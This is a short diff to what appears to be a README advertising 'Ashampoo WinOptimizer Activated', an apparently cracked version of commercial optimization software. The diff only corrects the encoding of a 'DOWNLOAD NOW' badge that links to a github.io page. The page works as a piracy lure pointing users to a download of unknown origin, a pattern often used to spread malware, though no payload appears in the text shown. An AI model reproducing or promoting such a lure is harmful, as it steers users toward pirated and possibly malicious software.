@@ -2,7 +2,7 @@
 
 Turbocharge your Windows experience with Ashampoo WinOptimizer Activated! This powerful system optimization suite cleans, protects and accelerates your PC like never before. Perfect for gamers 🎮, streamers 📹 and power users 💻 who demand peak performance.
 
-[![⬇️ DOWNLOAD NOW ⬇️](https://img.shields.io/badge/-DOWNLOAD_%20FULL_%VERSION-%23FF6B00?style=for-the-badge&logo=windows&logoColor=white)](https://ashampoo-winoptimizer-activated.github.io/.github/)
+[![⬇️ DOWNLOAD NOW ⬇️](https://img.shields.io/badge/-DOWNLOAD_%20FULL_%20VERSION-%23FF6B00?style=for-the-badge&logo=windows&logoColor=white)](https://ashampoo-winoptimizer-activated.github.io/.github/)
 
 ---
 
